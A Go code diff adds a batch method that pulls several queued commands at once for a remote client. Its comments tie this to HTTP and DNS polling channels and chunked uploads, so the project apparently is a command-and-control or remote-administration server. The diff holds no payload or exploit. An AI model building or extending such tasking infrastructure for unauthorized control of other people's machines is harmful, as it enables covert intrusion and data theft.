@@ -79,6 +79,49 @@ func (c *ClientCommandQueue) GetCommand(clientID string) (command []byte, ok boo
 	return command, true
 }
 
+// GetCommands 批量取出并移除至多 max 条命令（保序；不足则全取）。
+// 供轮询协议(HTTP/DNS)批量下发使用（CMD_BATCH, B5）:每轮单条拉取时批量任务
+// 每条命令一个完整 RTT,分块上传等连续任务极慢。
+func (c *ClientCommandQueue) GetCommands(clientID string, max int) [][]byte {
+	if max <= 0 {
+		return nil
+	}
+	v, exists := c.queues.Load(clientID)
+	if !exists {
+		return nil
+	}
+	cq := v.(*clientQueue)
+	cq.mu.Lock()
+	defer cq.mu.Unlock()
+
+	n := len(cq.data)
+	if n == 0 {
+		return nil
+	}
+	if n > max {
+		n = max
+	}
+	out := make([][]byte, n)
+	copy(out, cq.data[:n])
+	// 任务队列可视化:标记已取走
+	if GlobalCmdHistory != nil {
+		for _, cmd := range out {
+			GlobalCmdHistory.MarkRemoved(clientID, string(cmd))
+		}
+	}
+	// 已取部分置 nil 释放引用(同 GetCommand 的内存泄漏防护),余量前移
+	for i := 0; i < n; i++ {
+		cq.data[i] = nil
+	}
+	newData := cq.data[n:]
+	if len(newData) == 0 {
+		cq.data = nil // 空队列整体释放底层数组
+	} else {
+		cq.data = newData
+	}
+	return out
+}
+
 // DeleteClient 删除指定客户端的命令队列（断线/删除客户端时调用）
 func (c *ClientCommandQueue) DeleteClient(clientID string) {
 	c.queues.Delete(clientID)
